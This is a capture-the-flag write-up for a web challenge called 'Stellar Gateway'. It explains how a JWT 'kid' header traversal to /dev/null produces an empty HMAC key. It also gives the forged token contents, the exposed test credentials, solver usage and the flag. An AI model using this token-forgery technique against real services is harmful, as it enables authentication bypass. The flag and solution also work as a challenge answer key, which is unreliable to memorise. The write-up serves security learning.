---
tags:
  - web
  - uvt
---

# Stellar Gateway Writeup

Target: `http://194.102.62.175:21135`

Flag:

```text
UVT{Y0u_F0Und_m3_I_w4s_l0s7_1n_th3_v01d_of_sp4c3_I_am_gr3tefull_and_1'll_w4tch_y0ur_m0v3s_f00000000000r3v3r}
```

## Summary

The application exposes test credentials in `/login`, but the real bug is in the JWT verifier:

- the session cookie is an `HS256` JWT
- the JWT header contains a user-controlled `kid`
- the backend accepts `kid=../../../dev/null`
- the verifier then uses the contents of `/dev/null` as the HMAC key, which is an empty string

That lets us forge any token signed with an empty secret.

The important detail is that `/flag` is not gated on `role=admin`. The backend checks the identity string and only accepts `sub=administrator`.

## Enumeration

The login page source contains:

```html
<!-- Test credentials: pilot_001 / S3cret_P1lot_Ag3nt -->
```

Logging in returns a JWT like:

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "galactic-key.key"
}
```

and a payload like:

```json
{
  "sub": "pilot_001",
  "role": "crew"
}
```

Access to `/admin` and `/flag` is denied for this token.

## Exploit

Forge a new JWT with:

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../dev/null"
}
```

and:

```json
{
  "sub": "administrator",
  "role": "admin"
}
```

Sign it with `HS256` using the empty key `b""`.

Then send it as the `session` cookie to `/flag`.

## Solver

Solver file used locally: `solve_stellar_gateway.py`

Usage:

```bash
python3 solve_stellar_gateway.py
```

If you also want the forged JWT:

```bash
python3 solve_stellar_gateway.py --show-token
```

If the service is offline and you only want the forged token:

```bash
python3 solve_stellar_gateway.py --token-only
```

## Notes

- The visible creds are useful for understanding the token format, but not required for the final exploit.
- `role=admin` alone is not enough.
- The decisive condition is `sub=administrator`.
